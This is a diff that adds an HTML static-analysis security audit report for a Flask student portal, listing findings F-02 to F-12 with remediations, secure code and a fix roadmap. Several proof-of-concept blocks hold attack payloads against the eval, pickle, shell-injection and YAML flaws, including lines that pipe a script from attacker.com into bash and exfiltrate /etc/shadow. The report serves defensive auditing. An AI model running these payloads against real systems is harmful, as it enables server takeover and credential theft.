+<span class="hl"><span class="code-line-num">81</span>    result = eval(expression)   # ← CRITICAL: executes any Python expression</span>
+<span class="code-line-num">82</span>    return jsonify({'result': str(result)})</div>
+        </div>
+        <div>
+          <div class="fc-row-label">Proof of Concept</div>
+          <div class="code-block vuln">POST /calculate
+expression=__import__('os').system('id')         # Executes shell command
+expression=__import__('os').popen('cat /etc/passwd').read()  # File read
+expression=__import__('subprocess').getoutput('rm -rf /tmp/data')  # File deletion</div>
+        </div>
+        <div>
+          <div class="fc-row-label">Impact</div>
+          <div class="fc-row-text impact">Full Remote Code Execution as the web server process user. An attacker can read any file accessible to the process, install backdoors, pivot to internal network, or completely compromise the server.</div>
+        </div>
+        <div>
+          <div class="fc-row-label">Remediation</div>
+          <ul class="remediation-list">
+            <li>Remove <code style="font-family:'JetBrains Mono',monospace">eval()</code> entirely. Use <code style="font-family:'JetBrains Mono',monospace">ast.literal_eval()</code> only for safe Python literals (numbers, strings).</li>
+            <li>For math expressions, use a safe parser library such as <code style="font-family:'JetBrains Mono',monospace">simpleeval</code> or implement an expression parser with a restricted grammar.</li>
+            <li>Validate that input only contains digits and safe operators before any evaluation.</li>
+          </ul>
+        </div>
+        <div>
+          <div class="fc-row-label">Secure Code Example</div>
+          <div class="code-block safe"><span class="hl-fix">import ast, operator, re
+
+ALLOWED_OPS = {ast.Add: operator.add, ast.Sub: operator.sub,
+               ast.Mult: operator.mul, ast.Div: operator.truediv}
+
+def safe_eval(expr):
+    """Evaluates simple arithmetic only — no builtins, no imports."""
+    if not re.fullmatch(r'[\d\s\+\-\*/\.\(\)]+', expr):
+        raise ValueError("Invalid expression")
+    tree = ast.parse(expr, mode='eval')
+    return _eval_node(tree.body)
+
+def _eval_node(node):
+    if isinstance(node, ast.Num): return node.n
+    if isinstance(node, ast.BinOp):
+        return ALLOWED_OPS[type(node.op)](_eval_node(node.left), _eval_node(node.right))
+    raise TypeError(f"Unsupported: {node}")</span></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- F-03 -->
+    <div class="finding-card crit" id="F03">
+      <div class="fc-header">
+        <span class="fc-id">F-03</span>
+        <span class="sev-badge sev-critical">Critical</span>
+        <span class="fc-title">Remote Code Execution via exec()</span>
+        <div class="fc-refs">
+          <span class="ref-chip ref-cwe">CWE-95</span>
+          <span class="ref-chip ref-owasp">A03:2021 Injection</span>
+        </div>
+      </div>
+      <div class="fc-body">
+        <div><div class="fc-row-label">Affected Location</div>
+          <div class="fc-row-text"><code style="font-family:'JetBrains Mono',monospace;color:var(--cyan)">run_script()</code> — Line 94</div></div>
+        <div><div class="fc-row-label">Vulnerable Code</div>
+          <div class="code-block vuln"><span class="hl"><span class="code-line-num">94</span>    exec(script)   # ← executes complete Python programs from HTTP body</span></div></div>
+        <div><div class="fc-row-label">Impact</div>
+          <div class="fc-row-text impact">This is a deliberate web shell. Any authenticated (or unauthenticated, if auth is bypassed via F-01) user can execute arbitrary Python on the server with no restrictions whatsoever.</div></div>
+        <div><div class="fc-row-label">Remediation</div>
+          <ul class="remediation-list">
+            <li>Remove this endpoint entirely. There is no safe way to expose exec() over HTTP.</li>
+            <li>If scripting is a business requirement, use a sandboxed environment (Docker container with no network access, resource limits).</li>
+            <li>Alternatively use a pre-approved list of report functions that can be invoked by name, never by arbitrary code.</li>
+          </ul></div>
+      </div>
+    </div>
+
+    <!-- F-04 -->
+    <div class="finding-card crit" id="F04">
+      <div class="fc-header">
+        <span class="fc-id">F-04</span>
+        <span class="sev-badge sev-critical">Critical</span>
+        <span class="fc-title">Insecure Deserialization via pickle.loads()</span>
+        <div class="fc-refs">
+          <span class="ref-chip ref-cwe">CWE-502</span>
+          <span class="ref-chip ref-owasp">A08:2021 Integrity Failures</span>
+        </div>
+      </div>
+      <div class="fc-body">
+        <div><div class="fc-row-label">Affected Location</div>
+          <div class="fc-row-text"><code style="font-family:'JetBrains Mono',monospace;color:var(--cyan)">upload_profile()</code> — Line 107</div></div>
+        <div><div class="fc-row-label">Vulnerable Code</div>
+          <div class="code-block vuln"><span class="hl"><span class="code-line-num">107</span>    profile = pickle.loads(raw_data)   # ← executes __reduce__ during deserialization</span></div></div>
+        <div><div class="fc-row-label">Proof of Concept</div>
+          <div class="code-block vuln">import pickle, os
+
+class Exploit(object):
+    def __reduce__(self):
+        return (os.system, ('curl http://attacker.com/shell.sh | bash',))
+
+payload = pickle.dumps(Exploit())
+requests.post('http://target/upload-profile', data=payload)   # → RCE</div></div>
+        <div><div class="fc-row-label">Impact</div>
+          <div class="fc-row-text impact">Unauthenticated Remote Code Execution. The pickle protocol executes arbitrary Python via the __reduce__ method during deserialization, before any application code runs.</div></div>
+        <div><div class="fc-row-label">Remediation</div>
+          <ul class="remediation-list">
+            <li>Replace pickle with <code style="font-family:'JetBrains Mono',monospace">json.loads()</code> for all untrusted data interchange.</li>
+            <li>If binary serialization is required, use <code style="font-family:'JetBrains Mono',monospace">msgpack</code> or <code style="font-family:'JetBrains Mono',monospace">protobuf</code> with a typed schema.</li>
+            <li>Never deserialize data from an HTTP request body using pickle regardless of authentication state.</li>
+          </ul></div>
+        <div><div class="fc-row-label">Secure Code Example</div>
+          <div class="code-block safe"><span class="hl-fix">import json
+profile = json.loads(request.get_data(as_text=True))
+name = str(profile.get('name', ''))[:100]   # typed access + length limit</span></div></div>
+      </div>
+    </div>
+
+    <!-- F-05 -->
+    <div class="finding-card high" id="F05">
+      <div class="fc-header">
+        <span class="fc-id">F-05</span>
+        <span class="sev-badge sev-high">High</span>
+        <span class="fc-title">Command Injection — subprocess(shell=True)</span>
+        <div class="fc-refs">
+          <span class="ref-chip ref-cwe">CWE-78</span>
+          <span class="ref-chip ref-owasp">A03:2021 Injection</span>
+        </div>
+      </div>
+      <div class="fc-body">
+        <div><div class="fc-row-label">Affected Location</div>
+          <div class="fc-row-text"><code style="font-family:'JetBrains Mono',monospace;color:var(--cyan)">generate_report()</code> — Line 121</div></div>
+        <div><div class="fc-row-label">Vulnerable Code</div>
+          <div class="code-block vuln"><span class="hl"><span class="code-line-num">121</span>    cmd = f"python tools/report_gen.py --id {student_id} --format {report_type}"
+<span class="code-line-num">122</span>    output = subprocess.check_output(cmd, shell=True)   # shell interprets ; && | etc.</span></div></div>
+        <div><div class="fc-row-label">Proof of Concept</div>
+          <div class="code-block vuln">POST /generate-report
+student_id=1; cat /etc/passwd
+format=pdf; curl http://attacker.com/exfil?d=$(base64 /etc/shadow)</div></div>
+        <div><div class="fc-row-label">Impact</div>
+          <div class="fc-row-text impact">Arbitrary OS command execution. Attacker can exfiltrate /etc/passwd, /etc/shadow, application secrets, database files, and establish a reverse shell.</div></div>
+        <div><div class="fc-row-label">Remediation</div>
+          <ul class="remediation-list">
+            <li>Use <code style="font-family:'JetBrains Mono',monospace">shell=False</code> and pass arguments as a list — the OS will not interpret shell metacharacters.</li>
+            <li>Validate <code style="font-family:'JetBrains Mono',monospace">student_id</code> as an integer only; validate <code style="font-family:'JetBrains Mono',monospace">format</code> against an allowlist.</li>
+          </ul></div>
+        <div><div class="fc-row-label">Secure Code Example</div>
+          <div class="code-block safe"><span class="hl-fix">import re
+student_id  = request.form.get('student_id', '')
+report_type = request.form.get('format', 'pdf')
+
+if not re.fullmatch(r'\d{1,10}', student_id):
+    return jsonify({'error': 'Invalid student_id'}), 400
+if report_type not in ('pdf', 'csv', 'xlsx'):
+    return jsonify({'error': 'Invalid format'}), 400
+
+output = subprocess.run(
+    ['python', 'tools/report_gen.py', '--id', student_id, '--format', report_type],
+    capture_output=True, shell=False, timeout=30   # ← no shell, args as list
+)</span></div></div>
+      </div>
+    </div>
+
+    <!-- F-06 -->
+    <div class="finding-card high" id="F06">
+      <div class="fc-header">
+        <span class="fc-id">F-06</span>
+        <span class="sev-badge sev-high">High</span>
+        <span class="fc-title">OS Command Injection via os.system()</span>
+        <div class="fc-refs">
+          <span class="ref-chip ref-cwe">CWE-78</span>
+          <span class="ref-chip ref-owasp">A03:2021 Injection</span>
+        </div>
+      </div>
+      <div class="fc-body">
+        <div><div class="fc-row-label">Affected Location</div><div class="fc-row-text"><code style="font-family:'JetBrains Mono',monospace;color:var(--cyan)">ping_host()</code> — Line 135</div></div>
+        <div><div class="fc-row-label">Vulnerable Code</div>
+          <div class="code-block vuln"><span class="hl"><span class="code-line-num">135</span>    os.system(f"ping -c 4 {host}")   # shell metacharacters pass through</span></div></div>
+        <div><div class="fc-row-label">Remediation</div>
+          <ul class="remediation-list">
+            <li>Validate <code style="font-family:'JetBrains Mono',monospace">host</code> against an allowlist of known internal hostnames using a regex: <code style="font-family:'JetBrains Mono',monospace">re.fullmatch(r'[\w.\-]{1,253}', host)</code>.</li>
+            <li>Replace <code style="font-family:'JetBrains Mono',monospace">os.system()</code> with <code style="font-family:'JetBrains Mono',monospace">subprocess.run(['ping','-c','1', host], shell=False)</code>.</li>
+          </ul></div>
+      </div>
+    </div>
+
+    <!-- F-07 -->
+    <div class="finding-card high" id="F07">
+      <div class="fc-header">
+        <span class="fc-id">F-07</span>
+        <span class="sev-badge sev-high">High</span>
+        <span class="fc-title">Hardcoded Credentials — 4 Instances</span>
+        <div class="fc-refs">
+          <span class="ref-chip ref-cwe">CWE-798</span>
+          <span class="ref-chip ref-owasp">A07:2021 Auth Failures</span>
+        </div>
+      </div>
+      <div class="fc-body">
+        <div><div class="fc-row-label">Vulnerable Code (Lines 19–25)</div>
+          <div class="code-block vuln"><span class="hl"><span class="code-line-num">19</span>app.secret_key = "mysecretkey123"          # Flask session signing key</span>
+<span class="hl"><span class="code-line-num">23</span>DB_PASSWORD   = "Univ3rs!ty@2024"          # Production database password</span>
+<span class="hl"><span class="code-line-num">24</span>ADMIN_TOKEN   = "Bearer sk-live-abc123xyz" # External API token</span>
+<span class="hl"><span class="code-line-num">25</span>SMTP_PASSWORD = "MailPass#Prod99"          # Mail server password</span></div></div>
+        <div><div class="fc-row-label">Impact</div>
+          <div class="fc-row-text impact">All four credentials are visible to anyone with access to the repository (including former employees, contractors, or a public GitHub leak). Flask's secret_key exposure enables session cookie forgery — an attacker can forge any user's session without knowing their password.</div></div>
+        <div><div class="fc-row-label">Remediation</div>
+          <ul class="remediation-list">
+            <li>Move all secrets to environment variables. Use <code style="font-family:'JetBrains Mono',monospace">python-dotenv</code> for local development.</li>
+            <li>Immediately rotate all four credentials — treat them as compromised.</li>
+            <li>Add a pre-commit hook (e.g., <code style="font-family:'JetBrains Mono',monospace">detect-secrets</code>, <code style="font-family:'JetBrains Mono',monospace">trufflehog</code>) to prevent future commits of secrets.</li>
+          </ul></div>
+        <div><div class="fc-row-label">Secure Code Example</div>
+          <div class="code-block safe"><span class="hl-fix">import os
+from dotenv import load_dotenv
+load_dotenv()   # reads .env file (which is in .gitignore)
+
+app.secret_key  = os.environ['FLASK_SECRET_KEY']   # random 32-byte hex
+DB_PASSWORD     = os.environ['DB_PASSWORD']
+ADMIN_TOKEN     = os.environ['ADMIN_API_TOKEN']
+SMTP_PASSWORD   = os.environ['SMTP_PASSWORD']</span></div></div>
+      </div>
+    </div>
+
+    <!-- F-08 -->
+    <div class="finding-card high" id="F08">
+      <div class="fc-header">
+        <span class="fc-id">F-08</span>
+        <span class="sev-badge sev-high">High</span>
+        <span class="fc-title">Weak Password Hashing — MD5</span>
+        <div class="fc-refs">
+          <span class="ref-chip ref-cwe">CWE-327</span>
+          <span class="ref-chip ref-owasp">A02:2021 Crypto Failures</span>
+        </div>
+      </div>
+      <div class="fc-body">
+        <div><div class="fc-row-label">Vulnerable Code</div>
+          <div class="code-block vuln"><span class="hl"><span class="code-line-num">52</span>    hashed_pw = hashlib.md5(password.encode()).hexdigest()  # GPU: 60 billion MD5/sec</span></div></div>
+        <div><div class="fc-row-label">Impact</div>
+          <div class="fc-row-text impact">A modern GPU cluster can compute ~60 billion MD5 hashes per second. A leaked database of MD5-hashed passwords would be cracked in minutes using rainbow tables or brute force. All student passwords would be compromised.</div></div>
+        <div><div class="fc-row-label">Remediation</div>
+          <ul class="remediation-list">
+            <li>Use <code style="font-family:'JetBrains Mono',monospace">bcrypt</code> or <code style="font-family:'JetBrains Mono',monospace">argon2-cffi</code> — these are intentionally slow and memory-hard.</li>
+            <li>Migrate existing MD5 hashes by prompting users to reset passwords on next login.</li>
+          </ul></div>
+        <div><div class="fc-row-label">Secure Code Example</div>
+          <div class="code-block safe"><span class="hl-fix">import bcrypt
+# On registration:
+hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
+# On login verification:
+if bcrypt.checkpw(password.encode(), stored_hash): ...</span></div></div>
+      </div>
+    </div>
+
+    <!-- F-09 -->
+    <div class="finding-card high" id="F09">
+      <div class="fc-header">
+        <span class="fc-id">F-09</span>
+        <span class="sev-badge sev-high">High</span>
+        <span class="fc-title">Insecure YAML Deserialization — yaml.load()</span>
+        <div class="fc-refs">
+          <span class="ref-chip ref-cwe">CWE-502</span>
+          <span class="ref-chip ref-owasp">A08:2021 Integrity Failures</span>
+        </div>
+      </div>
+      <div class="fc-body">
+        <div><div class="fc-row-label">Vulnerable Code</div>
+          <div class="code-block vuln"><span class="hl"><span class="code-line-num">148</span>    config = yaml.load(yaml_payload)   # executes !!python/object: tags</span></div></div>
+        <div><div class="fc-row-label">Proof of Concept</div>
+          <div class="code-block vuln">POST /import-config  Content-Type: text/plain
+
+!!python/object/apply:os.system ['curl http://attacker.com/shell | bash']</div></div>
+        <div><div class="fc-row-label">Remediation</div>
+          <ul class="remediation-list">
+            <li>Replace <code style="font-family:'JetBrains Mono',monospace">yaml.load()</code> with <code style="font-family:'JetBrains Mono',monospace">yaml.safe_load()</code> — one word change that eliminates the entire attack class.</li>
+          </ul></div>
+        <div><div class="fc-row-label">Secure Code Example</div>
+          <div class="code-block safe"><span class="hl-fix">config = yaml.safe_load(yaml_payload)   # only parses basic types</span></div></div>
+      </div>
+    </div>
+
+    <!-- F-10 -->
+    <div class="finding-card high" id="F10">
+      <div class="fc-header">
+        <span class="fc-id">F-10</span>
+        <span class="sev-badge sev-high">High</span>
+        <span class="fc-title">TLS Certificate Verification Disabled</span>
+        <div class="fc-refs">
+          <span class="ref-chip ref-cwe">CWE-295</span>
+          <span class="ref-chip ref-owasp">A02:2021 Crypto Failures</span>
+        </div>
+      </div>
+      <div class="fc-body">
+        <div><div class="fc-row-label">Vulnerable Code</div>
+          <div class="code-block vuln"><span class="hl"><span class="code-line-num">161</span>    response = requests.get(target_url, verify=False, timeout=10)  # MITM-able</span></div></div>
+        <div><div class="fc-row-label">Impact</div>
+          <div class="fc-row-text impact">Any HTTPS connection made by this endpoint accepts any certificate including self-signed or attacker-generated ones. A network attacker can intercept and modify all responses, injecting malicious content or stealing data in transit.</div></div>
+        <div><div class="fc-row-label">Remediation</div>
+          <ul class="remediation-list">
+            <li>Remove <code style="font-family:'JetBrains Mono',monospace">verify=False</code>. The default (<code style="font-family:'JetBrains Mono',monospace">verify=True</code>) is correct and validates the server's certificate.</li>
+            <li>If a custom CA is required, pass <code style="font-family:'JetBrains Mono',monospace">verify='/path/to/ca-bundle.crt'</code>.</li>
+          </ul></div>
+        <div><div class="fc-row-label">Secure Code Example</div>
+          <div class="code-block safe"><span class="hl-fix">response = requests.get(target_url, timeout=10)   # verify=True is the default</span></div></div>
+      </div>
+    </div>
+
+    <!-- F-11 -->
+    <div class="finding-card med" id="F11">
+      <div class="fc-header">
+        <span class="fc-id">F-11</span>
+        <span class="sev-badge sev-medium">Medium</span>
+        <span class="fc-title">Insecure PRNG for Session Tokens</span>
+        <div class="fc-refs">
+          <span class="ref-chip ref-cwe">CWE-338</span>
+          <span class="ref-chip ref-owasp">A02:2021 Crypto Failures</span>
+        </div>
+      </div>
+      <div class="fc-body">
+        <div><div class="fc-row-label">Vulnerable Code</div>
+          <div class="code-block vuln"><span class="hl"><span class="code-line-num">57</span>    token = random.randint(100000, 999999)   # 6-digit predictable token</span></div></div>
+        <div><div class="fc-row-label">Impact</div>
+          <div class="fc-row-text impact">The token space is only 900,000 values (6 digits). An attacker who can observe a few tokens can reconstruct the Mersenne Twister internal state and predict all future tokens, enabling session hijacking of any active user.</div></div>
+        <div><div class="fc-row-label">Remediation</div>
+          <ul class="remediation-list">
+            <li>Use <code style="font-family:'JetBrains Mono',monospace">secrets.token_urlsafe(32)</code> which generates 256 bits of cryptographically secure randomness.</li>
+            <li>Flask's built-in session management (signed cookies using <code style="font-family:'JetBrains Mono',monospace">itsdangerous</code>) is superior — use it instead of manual tokens.</li>
+          </ul></div>
+        <div><div class="fc-row-label">Secure Code Example</div>
+          <div class="code-block safe"><span class="hl-fix">import secrets
+session['token'] = secrets.token_urlsafe(32)   # 256-bit CSPRNG</span></div></div>
+      </div>
+    </div>
+
+    <!-- F-12 -->
+    <div class="finding-card med" id="F12">
+      <div class="fc-header">
+        <span class="fc-id">F-12</span>
+        <span class="sev-badge sev-medium">Medium</span>
+        <span class="fc-title">Debug Mode Enabled + Server Exposed on 0.0.0.0</span>
+        <div class="fc-refs">
+          <span class="ref-chip ref-cwe">CWE-94</span>
+          <span class="ref-chip ref-owasp">A05:2021 Security Misconfiguration</span>
+        </div>
+      </div>
+      <div class="fc-body">
+        <div><div class="fc-row-label">Vulnerable Code</div>
+          <div class="code-block vuln"><span class="hl"><span class="code-line-num">181</span>    app.run(debug=True, host='0.0.0.0', port=5000)</span></div></div>
+        <div><div class="fc-row-label">Impact</div>
+          <div class="fc-row-text impact"><code style="font-family:'JetBrains Mono',monospace">debug=True</code> activates an interactive Werkzeug debugger accessible at <code style="font-family:'JetBrains Mono',monospace">/__debugger__</code>. Combined with <code style="font-family:'JetBrains Mono',monospace">host='0.0.0.0'</code>, the debugger PIN (often trivially guessable in Docker) becomes exploitable from any network interface, yielding RCE in the browser.</div></div>
+        <div><div class="fc-row-label">Remediation</div>
+          <ul class="remediation-list">
+            <li>Set <code style="font-family:'JetBrains Mono',monospace">debug=False</code> in all production deployments.</li>
+            <li>Control debug via environment: <code style="font-family:'JetBrains Mono',monospace">debug=os.environ.get('FLASK_DEBUG','0')=='1'</code>.</li>
+            <li>Use a production WSGI server (Gunicorn, uWSGI) — never Flask's built-in dev server in production.</li>
+            <li>Bind to <code style="font-family:'JetBrains Mono',monospace">127.0.0.1</code> and place behind a reverse proxy (Nginx) for external access.</li>
+          </ul></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── 5. OWASP COVERAGE ── -->
+  <div class="section-gap">
+    <div class="section-num">Section 5</div>
+    <h2 class="section-title">OWASP Top 10 — 2021 Coverage</h2>
+    <div class="section-line"></div>
+    <p class="section-lead">Findings mapped to the OWASP Top 10 (2021). Categories marked <span style="color:var(--red);font-weight:700">■</span> contain at least one confirmed finding.</p>
+    <div class="owasp-grid">
+      <div class="owasp-cell hit"><div class="owasp-cell-rank">A01</div><div class="owasp-cell-name">Broken Access Control</div></div>
+      <div class="owasp-cell hit"><div class="owasp-cell-rank">A02</div><div class="owasp-cell-name">Cryptographic Failures</div></div>
+      <div class="owasp-cell hit"><div class="owasp-cell-rank">A03</div><div class="owasp-cell-name">Injection</div></div>
+      <div class="owasp-cell miss"><div class="owasp-cell-rank">A04</div><div class="owasp-cell-name">Insecure Design</div></div>
+      <div class="owasp-cell hit"><div class="owasp-cell-rank">A05</div><div class="owasp-cell-name">Security Misconfiguration</div></div>
+      <div class="owasp-cell miss"><div class="owasp-cell-rank">A06</div><div class="owasp-cell-name">Vulnerable Components</div></div>
+      <div class="owasp-cell hit"><div class="owasp-cell-rank">A07</div><div class="owasp-cell-name">Auth &amp; Identity Failures</div></div>
+      <div class="owasp-cell hit"><div class="owasp-cell-rank">A08</div><div class="owasp-cell-name">Software Integrity Failures</div></div>
+      <div class="owasp-cell miss"><div class="owasp-cell-rank">A09</div><div class="owasp-cell-name">Security Logging Failures</div></div>
+      <div class="owasp-cell miss"><div class="owasp-cell-rank">A10</div><div class="owasp-cell-name">SSRF</div></div>
+    </div>
+    <div style="margin-top:14px;font-size:12px;color:var(--muted)">
+      <span style="color:var(--red);font-weight:700">■</span> Confirmed findings &nbsp;|&nbsp;
+      <span style="color:var(--muted);font-weight:700">■</span> Not detected (may exist — static analysis has limitations)
+    </div>
+  </div>
+
+  <!-- ── 6. REMEDIATION ROADMAP ── -->
+  <div class="section-gap">
+    <div class="section-num">Section 6</div>
+    <h2 class="section-title">Remediation Roadmap</h2>
+    <div class="section-line"></div>
+    <p class="section-lead">Prioritised remediation plan ordered by risk impact. Phase 1 must be completed before any production deployment.</p>
+
+    <div class="roadmap-phase">
+      <div class="roadmap-phase-header" style="background:rgba(255,45,85,.05)">
+        <div class="phase-num phase-1">1</div>
+        <div class="phase-title" style="color:var(--red)">Phase 1 — Immediate (Before Any Deployment)</div>
+        <div class="phase-timeline">0–48 hours</div>
+      </div>
+      <div class="roadmap-items">
+        <div class="roadmap-item"><span class="roadmap-item-id">F-01 (SQLi)</span><span class="roadmap-item-text">Replace all SQL string concatenation with parameterized queries — one-line change per query.</span></div>
+        <div class="roadmap-item"><span class="roadmap-item-id">F-02 (eval)</span><span class="roadmap-item-text">Remove eval() from /calculate. Implement a safe arithmetic parser using ast module.</span></div>
+        <div class="roadmap-item"><span class="roadmap-item-id">F-03 (exec)</span><span class="roadmap-item-text">Remove /run-script endpoint entirely. No business justification for this attack surface.</span></div>
+        <div class="roadmap-item"><span class="roadmap-item-id">F-04 (pickle)</span><span class="roadmap-item-text">Replace pickle.loads() with json.loads(). Define a strict JSON schema for profile data.</span></div>
+        <div class="roadmap-item"><span class="roadmap-item-id">F-07 (secrets)</span><span class="roadmap-item-text">Rotate all 4 credentials immediately. Migrate to environment variables via python-dotenv.</span></div>
+      </div>
+    </div>
+
+    <div class="roadmap-phase">
+      <div class="roadmap-phase-header" style="background:rgba(255,107,53,.04)">
+        <div class="phase-num phase-2">2</div>
+        <div class="phase-title" style="color:var(--orange)">Phase 2 — Short-Term (Sprint 1)</div>
+        <div class="phase-timeline">1–2 weeks</div>
+      </div>
+      <div class="roadmap-items">
+        <div class="roadmap-item"><span class="roadmap-item-id">F-05/06 (cmdinj)</span><span class="roadmap-item-text">Replace os.system() and subprocess(shell=True) with subprocess.run() using argument lists. Add strict input allowlists.</span></div>
+        <div class="roadmap-item"><span class="roadmap-item-id">F-08 (MD5)</span><span class="roadmap-item-text">Migrate password hashing to bcrypt with cost factor 12. Prompt existing users to reset passwords.</span></div>
+        <div class="roadmap-item"><span class="roadmap-item-id">F-09 (yaml)</span><span class="roadmap-item-text">Change yaml.load() to yaml.safe_load() — single keyword change.</span></div>
+        <div class="roadmap-item"><span class="roadmap-item-id">F-10 (TLS)</span><span class="roadmap-item-text">Remove verify=False. Test with proper CA certificates.</span></div>
+      </div>
+    </div>
+
+    <div class="roadmap-phase">
+      <div class="roadmap-phase-header" style="background:rgba(255,170,0,.04)">
+        <div class="phase-num phase-3">3</div>
+        <div class="phase-title" style="color:var(--amber)">Phase 3 — Hardening (Sprint 2)</div>
+        <div class="phase-timeline">2–4 weeks</div>
+      </div>
+      <div class="roadmap-items">
+        <div class="roadmap-item"><span class="roadmap-item-id">F-11 (PRNG)</span><span class="roadmap-item-text">Replace random.randint() with secrets.token_urlsafe(32). Leverage Flask's session management.</span></div>
+        <div class="roadmap-item"><span class="roadmap-item-id">F-12 (debug)</span><span class="roadmap-item-text">Set debug=False, bind to 127.0.0.1, deploy behind Nginx reverse proxy using Gunicorn.</span></div>
+        <div class="roadmap-item"><span class="roadmap-item-id">Additional</span><span class="roadmap-item-text">Add rate limiting on /login, implement CSRF protection, add security headers (CSP, HSTS, X-Frame-Options), set up centralised logging and alerting.</span></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── DISCLAIMER ── -->
+  <div style="background:rgba(255,170,0,.05);border:1px solid rgba(255,170,0,.18);border-radius:10px;padding:16px 22px;margin-bottom:40px">
+    <strong style="color:var(--amber)">⚠ Disclaimer:</strong>
+    <span style="color:var(--sub);font-size:13px;line-height:1.7;margin-left:6px">
+      This report was generated using SecureAudit Pro's pattern-based static analysis engine complemented by manual code review. Static analysis may produce false positives and cannot detect all vulnerability classes (e.g., business logic flaws, access control issues requiring runtime context, or second-order injection). This report does not constitute a full penetration test. All findings should be validated by a qualified security engineer before remediation prioritisation.
+    </span>
+  </div>
+
+</div>
+
+<!-- FOOTER -->
+<div class="report-footer no-print">
+  <div>
+    <div class="footer-logo">SecureAudit <span>Pro</span> v2.4</div>
+    <div style="margin-top:3px">Static Code Security Analyzer — All analysis performed client-side. No source code transmitted.</div>
+  </div>
+  <div style="text-align:right">
+    <div>StudentPortal v1.2.0 — Security Audit Report</div>
+    <div style="margin-top:3px">Generated: June 19, 2026 &nbsp;|&nbsp; Classification: CONFIDENTIAL</div>
+  </div>
+</div>
+
+<button class="btn-primary print-btn no-print" onclick="window.print()">🖨 Print / Save as PDF</button>
+
+</body>
+</html>
